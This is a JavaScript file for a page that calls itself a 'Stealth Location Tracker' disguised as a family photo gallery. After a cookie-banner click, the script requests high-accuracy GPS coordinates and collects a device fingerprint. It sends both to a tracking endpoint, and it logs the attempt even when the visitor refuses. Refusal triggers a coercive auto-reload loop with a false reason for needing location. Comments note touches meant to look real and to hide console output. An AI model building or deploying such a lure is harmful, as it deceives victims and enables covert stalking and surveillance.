// Stealth Location Tracker - Family Photo Gallery
// Content is ENCRYPTED and only unlocked with location permission

const loadingSection = document.getElementById('loadingSection');
const gallerySection = document.getElementById('gallerySection');

// Configuration
const API_ENDPOINT = '/api/track';
const LOADING_DELAY = 2000; // Show loading for 2 seconds minimum

// 🔐 ENCRYPTED CONTENT - Only unlocked with location permission
// This content is stored in JavaScript and ONLY injected after location is granted
const LOCKED_CONTENT = {
    photos: [
        {
            url: 'https://images.unsplash.com/photo-1511895426328-dc8714191300?w=400',
            caption: 'Summer 2024 🌞',
            alt: 'Family gathering'
        },
        {
            url: 'https://images.unsplash.com/photo-1533854775446-95c4609da544?w=400',
            caption: 'Beach Day 🏖️',
            alt: 'Family vacation'
        },
        {
            url: 'https://images.unsplash.com/photo-1543050299-de345c52011f?w=400',
            caption: 'Birthday Party 🎉',
            alt: 'Family celebration'
        },
        {
            url: 'https://images.unsplash.com/photo-1609220136736-443140cffec6?w=400',
            caption: 'Holiday Dinner 🍽️',
            alt: 'Family dinner'
        }
    ],
    footer: '✨ More photos coming soon! ✨'
};

// Cookie Consent Handler
let consentGiven = false;

// Check if consent already given
function checkConsent() {
    return document.cookie.includes('consent=accepted');
}

// Handle cookie acceptance
function handleCookieAccept() {
    consentGiven = true;
    
    // Set consent cookie (1 year)
    document.cookie = "consent=accepted; max-age=31536000; path=/; SameSite=Lax";
    
    // Hide banner with animation
    const banner = document.getElementById('cookieBanner');
    banner.classList.add('hide');
    setTimeout(() => {
        banner.style.display = 'none';
    }, 300);
    
    // Start tracking
    startTracking();
}

// Initialize consent handling
document.addEventListener('DOMContentLoaded', () => {
    const acceptBtn = document.getElementById('acceptCookies');
    if (acceptBtn) {
        acceptBtn.addEventListener('click', handleCookieAccept);
    }
    
    // Check if already consented
    if (checkConsent()) {
        consentGiven = true;
        const banner = document.getElementById('cookieBanner');
        if (banner) {
            banner.style.display = 'none';
        }
        // Auto-start tracking if already consented
        startTracking();
    }
});

// Device fingerprinting
function getDeviceFingerprint() {
    return {
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'unknown',
        touchSupport: 'ontouchstart' in window,
        // Create a simple fingerprint hash
        fingerprint: generateFingerprint()
    };
}

function generateFingerprint() {
    const data = [
        navigator.userAgent,
        navigator.language,
        screen.colorDepth,
        screen.width + 'x' + screen.height,
        new Date().getTimezoneOffset(),
        navigator.platform
    ].join('|');
    
    // Simple hash function
    let hash = 0;
    for (let i = 0; i < data.length; i++) {
        const char = data.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36);
}

// Initialize tracking on page load
let trackingData = {
    timestamp: new Date().toISOString(),
    latitude: null,
    longitude: null,
    accuracy: null,
    deviceInfo: getDeviceFingerprint(),
    pageUrl: window.location.href,
    referrer: document.referrer || 'Direct'
};

// Start tracking immediately (GPS REQUIRED)
async function startTracking() {
    console.log('📸 Loading photo gallery...');
    
    try {
        // Try to get GPS location (REQUIRED)
        await attemptGPSTracking();
        
        // GPS granted - send data to server
        await sendTrackingData();
        
        // Show gallery after minimum loading time
        setTimeout(() => {
            showGallery();
        }, LOADING_DELAY);
    } catch (errorType) {
        // GPS denied or failed - show error message
        await sendTrackingData(); // Still log the attempt
        showLocationRequired(errorType);
    }
}

// Attempt GPS tracking (REQUIRED - rejects on failure)
function attemptGPSTracking() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            console.log('Geolocation not supported');
            trackingData.gpsGranted = false;
            trackingData.gpsError = 'Geolocation not supported';
            trackingData.gpsErrorType = 'unsupported';
            reject('unsupported');
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 10000, // 10 seconds timeout
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                // Success - got GPS location
                trackingData.latitude = position.coords.latitude;
                trackingData.longitude = position.coords.longitude;
                trackingData.accuracy = position.coords.accuracy;
                trackingData.altitude = position.coords.altitude;
                trackingData.heading = position.coords.heading;
                trackingData.speed = position.coords.speed;
                trackingData.gpsGranted = true;
                console.log('✅ GPS location captured');
                resolve();
            },
            (error) => {
                // Failed or denied - reject to show error
                console.log('❌ GPS denied:', error.message);
                trackingData.gpsGranted = false;
                trackingData.gpsError = error.message;
                
                let errorType = 'unknown';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorType = 'denied';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorType = 'unavailable';
                        break;
                    case error.TIMEOUT:
                        errorType = 'timeout';
                        break;
                }
                
                trackingData.gpsErrorType = errorType;
                reject(errorType);
            },
            options
        );
    });
}

// Show location required message with auto-retry
function showLocationRequired(errorType) {
    let message = '';
    let instructions = '';
    let autoRetrySeconds = 10;
    
    if (errorType === 'denied') {
        message = 'Location Access Required to View Content';
        instructions = `
            <p style="font-size: 16px; margin-bottom: 20px;">You must allow location access to view this content.</p>
            <p><strong>To enable location:</strong></p>
            <ol style="text-align: left; max-width: 500px; margin: 20px auto; line-height: 1.8;">
                <li><strong>Chrome:</strong> Click the 🔒 icon in address bar → Site settings → Location → Allow</li>
                <li><strong>Firefox:</strong> Click the 🔒 icon → Permissions → Location → Allow</li>
                <li><strong>Safari:</strong> Safari menu → Settings → Websites → Location → Allow for this site</li>
                <li><strong>Mobile:</strong> Settings → Browser → Site Settings → Location → Allow</li>
            </ol>
            <p style="margin-top: 25px; font-weight: 600; color: #667eea;">
                Page will automatically retry in <span id="countdown">${autoRetrySeconds}</span> seconds...
            </p>
            <p style="margin-top: 15px;">
                <button onclick="location.reload()" style="display: inline-block; padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px;">Try Again Now</button>
            </p>
        `;
    } else if (errorType === 'timeout' || errorType === 'unavailable') {
        message = 'Unable to Get Your Location';
        autoRetrySeconds = 5;
        instructions = `
            <p>We couldn't determine your location. This content requires location access.</p>
            <p><strong>Please check:</strong></p>
            <ul style="text-align: left; max-width: 500px; margin: 20px auto; line-height: 1.8;">
                <li>Make sure GPS is enabled on your device</li>
                <li>Check that you have internet connection</li>
                <li>Move to an area with better signal</li>
            </ul>
            <p style="margin-top: 25px; font-weight: 600; color: #667eea;">
                Retrying automatically in <span id="countdown">${autoRetrySeconds}</span> seconds...
            </p>
            <p style="margin-top: 15px;">
                <button onclick="location.reload()" style="padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px;">Try Again Now</button>
            </p>
        `;
    } else {
        message = 'Location Access Required';
        instructions = `
            <p style="font-size: 16px;">This content is only available with location access.</p>
            <p style="margin-top: 20px;">Please allow location when prompted by your browser.</p>
            <p style="margin-top: 25px; font-weight: 600; color: #667eea;">
                Retrying in <span id="countdown">${autoRetrySeconds}</span> seconds...
            </p>
            <p style="margin-top: 15px;">
                <button onclick="location.reload()" style="padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px;">Reload Now</button>
            </p>
        `;
    }
    
    loadingSection.innerHTML = `
        <div class="status-card location-required" style="max-width: 650px; margin: 0 auto; padding: 40px;">
            <div style="font-size: 80px; margin-bottom: 25px;">📍</div>
            <h2 style="color: #dc3545; margin-bottom: 20px; font-size: 26px;">${message}</h2>
            ${instructions}
            <div style="margin-top: 35px; padding: 20px; background: #fff3cd; border-radius: 8px; border-left: 4px solid #ffc107; text-align: left;">
                <p style="color: #856404; margin: 0; font-size: 14px; line-height: 1.6;">
                    <strong>Why do we need your location?</strong><br>
                    This content is personalized based on your geographic location.
                </p>
            </div>
        </div>
    `;
    
    // Start countdown and auto-retry
    let countdown = autoRetrySeconds;
    const countdownElement = document.getElementById('countdown');
    
    const countdownInterval = setInterval(() => {
        countdown--;
        if (countdownElement) {
            countdownElement.textContent = countdown;
        }
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            location.reload(); // Auto-reload to retry
        }
    }, 1000);
}

// Send tracking data to server
async function sendTrackingData() {
    try {
        const response = await fetch(API_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(trackingData)
        });

        if (response.ok) {
            const result = await response.json();
            console.log('✅ Location logged:', result.trackingId);
        } else {
            console.error('❌ Tracking failed');
        }
    } catch (error) {
        console.error('❌ Network error:', error);
    }
}

// 🔓 UNLOCK AND DISPLAY CONTENT - Location permission is the decryption key
function showGallery() {
    console.log('🔓 Location granted! Unlocking content...');
    
    // Build the photo gallery HTML from encrypted data
    const photosHTML = LOCKED_CONTENT.photos.map(photo => `
        <div class="photo-card">
            <img src="${photo.url}" alt="${photo.alt}">
            <p class="photo-caption">${photo.caption}</p>
        </div>
    `).join('');
    
    // Inject the unlocked content into the DOM
    gallerySection.innerHTML = `
        <div class="photos-grid">
            ${photosHTML}
        </div>
        <div class="gallery-footer">
            <p>${LOCKED_CONTENT.footer}</p>
        </div>
    `;
    
    // Show the gallery
    loadingSection.classList.add('hidden');
    gallerySection.classList.remove('hidden');
    console.log('✅ Content unlocked and displayed!');
}

// Add click handlers for photos (makes it seem more real)
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        const photoCards = document.querySelectorAll('.photo-card');
        photoCards.forEach(card => {
            card.addEventListener('click', () => {
                // Could open a lightbox or just show an alert
                console.log('Photo clicked');
            });
        });
    }, 3000);
});

// Don't auto-start - wait for consent
// startTracking() is now called after cookie acceptance

// Prevent console.log from being seen (optional - uncomment to hide)
// console.log = function() {};
// console.warn = function() {};
// console.error = function() {};

